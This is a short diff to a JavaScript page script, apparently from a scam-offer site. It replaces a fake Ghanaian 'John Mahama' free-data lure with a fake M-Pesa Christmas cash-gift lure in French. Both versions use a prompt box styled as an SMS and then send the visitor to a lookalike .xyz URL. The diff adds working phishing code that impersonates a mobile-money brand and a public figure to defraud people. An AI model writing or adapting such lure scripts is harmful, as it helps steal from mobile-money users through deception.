@@ -1,7 +1,8 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '0k'
-password=prompt('SMS: Welcome to Ghana GH₵10 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != 'ok') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = '50.000FCFA'
+password=prompt('SMS: Félicitations ! Votre compte M-Pesa est éligible pour recevoir le cadeau de Noël M-Pesa de 50.000FCFA. Veuillez cliquer sur OK pour continuer. ','50.000FCFA');
+if (password != '50.000FCFA') {
+location.href='https://mpesa-drc.goprogram.xyz/gift';
 
 }
+
